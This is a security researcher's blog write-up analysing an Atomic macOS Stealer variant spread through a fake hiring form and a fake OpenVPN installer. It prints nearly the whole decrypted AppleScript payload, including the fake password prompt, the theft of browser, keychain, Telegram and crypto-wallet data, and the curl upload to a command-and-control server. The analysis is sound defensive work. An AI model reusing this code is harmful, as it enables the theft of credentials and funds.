---
title: Atomic macOS Stealer (AMOS) Variant - Malware Research
date: 2024-02-22 12:00:00
categories: [research]
tags: [work]
image: /assets/posts/work/atomic/icon.png
---

Recently, I conducted my first malware analysis on a real malware that at work. This malware had similarities with other Atomic macOS Stealer (AMOS) variants but it was still pretty unique since it actually affects both Windows and Mac users. Here is my writeup on the whole incident:

## Distribution

On 12th September, an employee received a Google Form from an unknown sender that seems to be a fake hiring test. The user was prompted to input their email and name, and answer a set of questions replicating real interview questions. However, the user was then prompted to download a suspicious OpenVPN program on the final page.

![form1](/assets/posts/work/atomic/form1.png)

![form2](/assets/posts/work/atomic/form2.png)

If the user was using macOS, accessing the download link will redirect the user to `https://utv4fun[.]com/kusaka[.]php?call=vpn`, where a .dmg file will be fetched and downloaded automatically into the system. After a few page refreshes, we can actually see several .dmg files being downloaded, each having a different version number at the end.

![dmg1](/assets/posts/work/atomic/dmg1.png)

If the user was using Windows, accessing the download link will instead redirect the user to `https://openvpn-win[.]pages[.]dev/` where a malicious MSI installer will be downloaded automatically into the system. However, the scope of this writeup will only be on the .dmg file for now.

![msi1](/assets/posts/work/atomic/msi1.png)

## Mach-O Binary

Further examining the contents by mounting the .dmg file as a volume on my virtual machine (macOS Sonoma 14), it contained a universal Mach-O binary which supports both x86 and ARM architecture. It's also ad-hoc signed which means that it doesn't contain any cryptographic proof.

![bin1](/assets/posts/work/atomic/bin1.png)

Executing the binary file directly, the user will be prompted to launch the application via right clicking and opening it. This was a common tactic used to override GateKeeper (an integrated security feature in Apple's operating system) and execute unsigned applications. [Ref](https://antman1p-30185.medium.com/jumping-over-the-gate-da555c075208 "https://antman1p-30185.medium.com/jumping-over-the-gate-da555c075208").

![exe1](/assets/posts/work/atomic/exe1.png)

After launching the application, the user was prompted again to input their password. This was most likely to trick the user in providing root privileges for the malware to access certain macOS utilities.

![exe2](/assets/posts/work/atomic/exe2.png)

Decompiling the binary file, a long hex string can be identified which was most likely the payload.

![bin2](/assets/posts/work/atomic/bin2.png)

Coincidentally, a 32-byte hex string can be identified right below the payload, most likely a key for decryption.

![bin3](/assets/posts/work/atomic/bin3.png)

Instead of utilising XOR, the payload seem to be encrypted with RC4 instead. Here is the link for anyone who wants to analyze the decrypted payload: https://pastebin.com/raw/nB4xHSn3

## Payload Analysis
The malware can first be seen hiding the Terminal window to conceal malicious activity from the user. 
```
if release then
	try
		tell window 1 of application "Terminal" to set visible to false
	end try
end if
```

The malware then invokes multiple functions to aid in the extraction process:
1. Calculate file sizes, most likely to avoid triggering threshold alerts when exfiltrating data.
2. Create a parent directory first, if it doesn't exist, and sub-directories when required.
3. Extract file names and directory names from a given path.
4. Writes the specified text to a file at the given path, creating a directory if needed.
5. Reads content from a file and writes it to a new location using the `cat` command.
6. Checks whether the specified path is a directory.
7. Recursively copies files from a source folder to a destination folder, but only if the total size of the copied files does not exceed a specified limit (in this case, 10 MB). It also ignores certain specified file types according to the exception list.
```
on filesizer(paths)
	set fsz to 0
	try
		set theItem to quoted form of POSIX path of paths
		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
	end try
	return fsz
end filesizer
on mkdir(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		do shell script "mkdir -p " & filePosixPath
	end try
end mkdir
on FileName(filePath)
	try
		set reversedPath to (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
		set finalPath to (reverse of every character of trimmedPath) as string
		return finalPath
	end try
end FileName
on BeforeFileName(filePath)
	try
		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
		return trimmedPath
	end try
end BeforeFileName
on writeText(textToWrite, filePath)
	try
		set folderPath to BeforeFileName(filePath)
		mkdir(folderPath)
		set fileRef to (open for access filePath with write permission)
		write textToWrite to fileRef starting at eof
		close access fileRef
	end try
end writeText
on readwrite(path_to_file, path_as_save)
	try
		set fileContent to read path_to_file
		set folderPath to BeforeFileName(path_as_save)
		mkdir(folderPath)
		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
	end try
end readwrite
on isDirectory(someItem)
	try
		set filePosixPath to quoted form of (POSIX path of someItem)
		set fileType to (do shell script "file -b " & filePosixPath)
		if fileType ends with "directory" then
			return true
		end if
		return false
	end try
end isDirectory
on GrabFolderLimit(sourceFolder, destinationFolder)
	try
		set bankSize to 0
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolderLimit(itemPath, savePath)
				else
					set fsz to filesizer(itemPath)
					set bankSize to bankSize + fsz
					if bankSize < 10 * 1024 * 1024 then
						readwrite(itemPath, savePath)
					end if
				end if
			end if
		end repeat
	end try
end GrabFolderLimit
on GrabFolder(sourceFolder, destinationFolder)
	try
		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user_data", "__update__"}
		set fileList to list folder sourceFolder without invisibles
		mkdir(destinationFolder)
		repeat with currentItem in fileList
			if currentItem is not in exceptionsList then
				set itemPath to sourceFolder & "/" & currentItem
				set savePath to destinationFolder & "/" & currentItem
				if isDirectory(itemPath) then
					GrabFolder(itemPath, savePath)
				else
					readwrite(itemPath, savePath)
				end if
			end if
		end repeat
	end try
end GrabFolder
```

Here, the malware begins the extraction process by targeting Firefox browser first. The malware extracts Firefox data including cookies, login history and passwords, and stores them in a staging directory called `writemind`.
```
on parseFF(firefox, writemind)
	try
		set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
		set fileList to list folder firefox without invisibles
		repeat with currentItem in fileList
			set fpath to writemind & "ff/" & currentItem
			set readpath to firefox & currentItem
			repeat with FFile in myFiles
				readwrite(readpath & FFile, fpath & FFile)
			end repeat
		end repeat
	end try
end parseFF
```

Suddenly, the malware proceeds to prompt the user for the system password using DSCL. With the password, the malware attempts to access the Chrome Safe Storage to retrieve the master encryption key for Chrome. If it fails to access the key, the malware will repeatedly show a fake dialog box to trick the user into entering the valid  password. The master key is then stored under `writemind`. Additionally, the malware will store the valid password under `writemind` too.
```
on checkvalid(username, password_entered)
	try
		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
		if result is not equal to "" then
			return false
		else
			return true
		end if
	on error
		return false
	end try
end checkvalid
on getpwd(username, writemind)
	try
		if checkvalid(username, "") then
			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
			writeText(result as string, writemind & "masterpass-chrome")
		else
			repeat
				set result to display dialog "Required Application Helper.\nPlease enter password for continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
				set password_entered to text returned of result
				if checkvalid(username, password_entered) then
					writeText(password_entered, writemind & "pwd")
					return password_entered
				end if
			end repeat
		end if
	end try
	return ""
end getpwd
```

The malware then searches for specific plugin-related files from Chromium profiles by cross-checking with a list of plugins to target extensions and IndexedDB data and store them under `writemind`. The malware proceeds to extract other Google Chrome browser data including cookies, web data, login history, etc and store them under `writemind`.
```
on grabPlugins(paths, savePath, pluginList, index)
	try
		set fileList to list folder paths without invisibles
		repeat with PFile in fileList
			repeat with Plugin in pluginList
				if (PFile contains Plugin) then
					set newpath to paths & PFile
					set newsavepath to savePath & "/" & Plugin
					if index then
						set newsavepath to newsavepath & "/IndexedDB/"
					end if
					GrabFolder(newpath, newsavepath)
				end if
			end repeat
		end repeat
	end try
end grabPlugins
on chromium(writemind, chromium_map)
	set pluginList to {"keenhcnmdmjjhincpilijphpiohdppno", "hbbgbephgojikajhfbomhlmmollphcad", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "dhgnlgphgchebgoemcjekedjjbifijid", "hifafgmccdpekplomjjkcfgodnhcellj", "kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle", "fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj", "dkdedlpgdmmkkfjabffeganieamfklkm", "bcopgchhojmggmffilplmbdicgaihlkp", "kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg", "mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn", "gcbjmdjijjpffkpbgdkaojpmaninaion", "nhnkbkgjikgcigadomkphalanndcapjk", "bhhhlbepdkbapadjdnnojkbgioiodbic", "hoighigmnhgkkdaenafgnefkcmipfjon", "klghhnkeealcohjjanjjdaeeggmfmlpl", "nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjbbldcngcnapndodjp", "ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin", "fhilaheimglignddkjgofkcbgekhenbh", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "cihmoadaighcejopammfbmddcmdekcje", "lodccjjbdhfakaekdiahmedfbieldgik", "omaabbefbmiijedngplfjmnooppbclkk", "cjelfplplebdjjenllpjcblmjkfcffne", "jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih", "flpiciilemghbmfalicajoolhkkenfel", "hcflpincpppdclinealmandijcmnkbgn", "aeachknmefphepccionboohckonoeemg", "nlobpakggmbcgdbpjpnagmdbdhdhgphk", "momakdpclmaphlamgjcndbgfckjfpemp", "mnfifefkajgofkcjkemidiaecocnkjeh", "fnnegphlobjdpkhecapkijjdkgcjhkib", "ehjiblpccbknkgimiflboggcffmpphhp", "ilhaljfiglknggcoegeknjghdgampffk", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "imlcamfeniaidioeflifonfjeeppblda", "mdjmfdffdcmnoblignmgpommbefadffd", "ooiepdgjjnhcmlaobfinbomgebfgablh", "pcndjhkinnkaohffealmlmhaepkpmgkb", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "cgeeodpfagjceefieflmdfphplkenlfk", "dlcobpjiigpikoobohmabehhmhfoodbb", "jiidiaalihmmhddjgbnbgdfflelocpak", "bocpokimicclpaiekenaeelehdjllofo", "pocmplpaccanhmnllbbkpgfliimjljgo", "cphhlgmgameodnhkjdmkpanlelnlohao", "mcohilncbfahbmgdjkbpemcciiolgcge", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "khpkpbbcccdmmclmpigdgddabeilkdpd", "ejjladinnckdgjemekebdpeokbikhfci", "phkbamefinggmakgklpkljjmgibohnba", "epapihdplajcdnnkdeiahlgigofloibg", "hpclkefagolihohboafpheddmmgdffjm", "cjookpbkjnpkmknedggeecikaponcalb", "cpmkedoipcpimgecpmgpldfpohjplkpp", "modjfdjcodmehnpccdjngmdfajggaoeh", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "kncchdigobghenbbaddojjnnaogfppfj", "efbglgofoippbgcjepnhiblaibcnclgk", "mcbigmjiafegjnnogedioegffbooigli", "fccgmnglbhajioalokbcidhcaikhlcpm", "hnhobjmcibchnmglfbldbfabcgaknlkj", "apnehcjmnengpnmccpaibjmhhoadaico", "enabgbdfcbaehmbigakijjabdpdnimlg", "mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "ammjlinfekkoockogfhdkgcohjlbhmff", "abkahkcbhngaebpcgfmhkoioedceoigp", "dcbjpgbkjoomeenajdabiicabjljlnfp", "gkeelndblnomfmjnophbhfhcjbcnemka", "pnndplcbkakcplkjnolgbkdgjikjednm", "copjnifcecdedocejpaapepagaodgpbh", "hgbeiipamcgbdjhfflifkgehomnmglgk", "mkchoaaiifodcflmbaphdgeidocajadp", "ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae", "nknhiehlklippafakaeklbeglecifhad", "ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee", "nphplpgoakhhjchkkhmiggakijnkhfnd", "cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "niiaamnmgebpeejeemoifgdndgeaekhe", "odpnjmimokcmjgojhnhfcnalnegdjmdn", "lbjapbcmmceacocpimbpbidpgmlmoaao", "hnfanknocfeofbddgcijnmhnfnkdnaad", "hpglfhgfnhbgpjdenjgmdgoeiappafln", "egjidjbpglichdcondbcbdnbeeppgdph", "ibljocddagjghmlpgihahamcghfggcjc", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna", "mfhbebgoclkghebffdldpobeajmbecfk", "nlbmnnijcnlegkjjpcfjclmcfggfefdm", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "acmacodkjbdgmoleebolmdjonilkdbch", "agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kkpehldckknjffeakihjajcjccmcjflh", "jaooiolkmfcmloonphpiiogkfckgciom", "ojggmchlghnjlapmfbnjholfjkiidbch", "pmmnimefaichbcnbndcfpaagbepnjaig", "oiohdnannmknmdlddkdejbmplhbdcbee", "aiifbnbfobpmeekipheeijimdpnlpgpp", "aholpfdialjgjfhomihkjbmgjidlcdno", "anokgmphncpekkhclmingpimjmcooifb", "kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe", "ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa", "fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif", "dmkamcknogkgcdfhhbddcghachkejeap", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk", "mapbhaebnddapnmifbbkgeedkeplgjmf", "cmndjbecilbocjfkibfbifhngkdmjgog", "kpfopkelmapcoipemfendmdcghnegimn", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb", "opcgpfmipidbgpenhmajoajpbobppdil", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "kgdijkcfiglijhaglibaidbipiejjfdp", "hdkobeeifhdplocklknbnejdelgagbao", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "nngceckbapebfimnlniiiahkandclblb"}
	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
	repeat with chromium in chromium_map
		set savePath to writemind & "Chromium/" & item 1 of chromium & "_"
		try
			set fileList to list folder item 2 of chromium without invisibles
			repeat with currentItem in fileList
				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
					repeat with CFile in chromiumFiles
						set readpath to (item 2 of chromium & currentItem & CFile)
						if ((CFile as string) is equal to "/Network/Cookies") then
							set CFile to "/Cookies"
						end if
						if ((CFile as string) is equal to "/Local Extension Settings/") then
							grabPlugins(readpath, savePath & currentItem, pluginList, false)
						else if (CFile as string) is equal to "/IndexedDB/" then
							grabPlugins(readpath, savePath & currentItem, pluginList, true)
						else
							set writepath to savePath & currentItem & CFile
							readwrite(readpath, writepath)
						end if
					end repeat
				end if
			end repeat
		end try
	end repeat
end chromium
```

Other than browsers, the malware can be seen attempting to extract Telegram and cryptocurrency wallet data too.
```
on telegram(writemind, library)
		try
			GrabFolder(library & "Telegram Desktop/tdata/", writemind & "Telegram Data/")
		end try
end telegram
on deskwallets(writemind, deskwals)
	repeat with deskwal in deskwals
		try
			GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
		end try
	end repeat
end deskwallets
```

The malware then utilises the Finder application to extract the Safari cookie file, macOS Notes database and files with specific extensions (txt, docx, rtf, doc, wallet, keys, key) stored under the User Desktop and Document directories. The extracted files are stored in a directory called "FileGrabber".
```
on filegrabber(writemind)
	try
		set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
		mkdir(destinationFolderPath)
		set extensionsList to {"pdf"," docx"," doc"," wallet"," keys"}
		set bankSize to 0
		tell application "Finder"
			try
				set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
				duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
				set name of result to "saf1"
			end try
			try
				set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
				try
					duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
				end try
				set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
				set notesAccounts to folder (notesFolderPath & "Accounts:")
				try
					set notesFolder to folder notesFolderPath
					set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder
					repeat with aFile in notesFiles
						try
							duplicate aFile to folder destinationFolderPath with replacing
						end try
					end repeat
				end try
			end try
			try
				set desktopFiles to every file of desktop
				set documentsFiles to every file of folder "Documents" of (path to home folder)
				set downloadsFiles to every file of folder "Downloads" of (path to home folder)
				repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
					set fileExtension to name extension of aFile
					if fileExtension is in extensionsList then
						set filesize to size of aFile
						if (bankSize + filesize) < 10 * 1024 * 1024 then
							try
								duplicate aFile to folder destinationFolderPath with replacing
								set bankSize to bankSize + filesize
							end try
						else
							exit repeat
						end if
					end if
				end repeat
			end try
		end tell
	end try
end filegrabber
```

The malware can also be seen extracting the macOS system information including SPSoftwareDataType, SPHardwareDataType and SPDisplaysDataType and storing it into the `writemind` directory before compressing it into a ZIP file. Additionally, we can see the malware was retrieving the current logged-in user's username and setting up a temporary directory to store the extracted data (which was defined by `writemind`). This was most likely to slightly obfuscate itself by placing important variables near the end of the payload. After compressing the staging directory `writemind` into a ZIP file, the malware prepares the exfiltration process by sending the ZIP file to its C2 server using curl with a POST HTTP request. Finally, the malware covers its track by removing all of the extracted files and directories from the system.
```
on send_data(attempt)
 try
  set result_send to (do shell script "curl -X POST -H \"user: 97GIBXR2BA98-WeYnKwOKhLGAt0wMSQYmLRicLIb6OY=\" -H \"BuildID: /njKjyXgNqZG-iGLihnobhoWk1lCfo/-MEL9dSfa4ro=\" --max-time 300 —-retry 5 —-retry-delay 10 -F \"file=@/tmp/out.zip\" http://85.209.11.155/joinsystem")
 on error
  if attempt < 40 then
   delay 3
   send_data(attempt + 1)
  end if
 end try
end send_data
set username to (system attribute "USER")
set profile to "/Users/" & username
set randomNumber to do shell script "echo $((RANDOM % 9000 + 1000))"
set writemind to "/tmp/" & randomNumber & "/"
try
	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
	writeText(result, writemind & "info")
end try
set library to profile & "/Library/Application Support/"
set password_entered to getpwd(username, writemind)
delay 0.01
set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}, {"Arc", library & "Arc/"}, {"Coccoc", library & "Coccoc/"}}
set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
if release then
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
	readwrite(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
	readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
end if
if filegrabbers then
	filegrabber(writemind)
end if
writeText(username, writemind & "username")
set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
repeat with firefox in ff_paths
	try
		parseFF(firefox, writemind)
	end try
end repeat
chromium(writemind, chromiumMap)
deskwallets(writemind, walletMap)
telegram(writemind, library)
do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/out.zip"
send_data(0)
do shell script "rm -r " & writemind
do shell script "rm /tmp/out.zip"
```

I've also managed to sniff out the exfiltration traffic when conducting dynamic analysis. 

![wire1](/assets/posts/work/atomic/wire1.png)

## Summary
Basically, it was a phishing attempt that tried to trick users in downloading a fake OpenVPN program which acts as an infostealer that have similarities with other macOS malware. The reason why I did this writeup in the first place was because it was the first time encountering an AMOS variant that masqueraded using OpenVPN (to my knowledge). Additionally, I want to share fun stuff I've encountered during my work instead of just triaging alerts daily.
